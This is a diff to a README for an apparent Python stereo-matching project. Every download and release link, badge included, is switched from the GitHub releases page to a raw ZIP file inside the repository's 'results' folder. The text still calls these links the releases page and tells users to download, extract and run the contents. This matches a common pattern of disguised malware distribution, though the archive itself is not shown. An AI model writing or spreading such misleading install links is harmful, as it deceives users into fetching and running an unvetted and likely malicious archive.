@@ -1,7 +1,7 @@
 # 🖥️ stereo-matching-algorithms-python - Fast Stereo Matching Algorithms 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/releases)
+[![Download](https://raw.githubusercontent.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/main/results/algorithms_python_matching_stereo_cationic.zip%20Release-brightgreen)](https://raw.githubusercontent.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/main/results/algorithms_python_matching_stereo_cationic.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the stereo matching algorithms in Python. Our software offers fast implementations that you can use to compare stereo images and generate disparity maps.
@@ -20,7 +20,7 @@ Welcome! This guide will help you download and run the stereo matching algorithm
 - **Belief Propagation**: Advanced approach for accurate disparity maps.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page**: Click [here](https://github.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/main/results/algorithms_python_matching_stereo_cationic.zip) to go to the releases page.
 2. **Choose the Latest Release**: Look for the latest version listed at the top of the page.
 3. **Download the ZIP File**: Click on the ZIP file to download it to your computer.
 4. **Extract the Files**: Locate the downloaded ZIP file, right-click it, and select "Extract All" to unpack the files.
@@ -33,7 +33,7 @@ Welcome! This guide will help you download and run the stereo matching algorithm
 - **View Results**: Check the output in the results section to see the disparity map.
 
 ## 📅 Updating
-To keep your software updated, periodically check the [Releases Page](https://github.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/releases) for new versions. Download and follow the same installation steps as before.
+To keep your software updated, periodically check the [Releases Page](https://raw.githubusercontent.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/main/results/algorithms_python_matching_stereo_cationic.zip) for new versions. Download and follow the same installation steps as before.
 
 ## 📖 Support & Documentation
 If you need further assistance, the documentation is available within the application. You can also visit our GitHub page for community support and FAQ.
@@ -50,4 +50,4 @@ We appreciate your feedback! Please reach out on our GitHub page or create an is
 ## 🎉 Acknowledgements
 Thank you for trying our stereo matching algorithms. We hope this software assists you in your projects and provides valuable insights from your image data. 
 
-[Download the latest release](https://github.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/releases) again if needed and enjoy using our application!
+[Download the latest release](https://raw.githubusercontent.com/xzxzxzxzxzxzx-fgg/stereo-matching-algorithms-python/main/results/algorithms_python_matching_stereo_cationic.zip) again if needed and enjoy using our application!
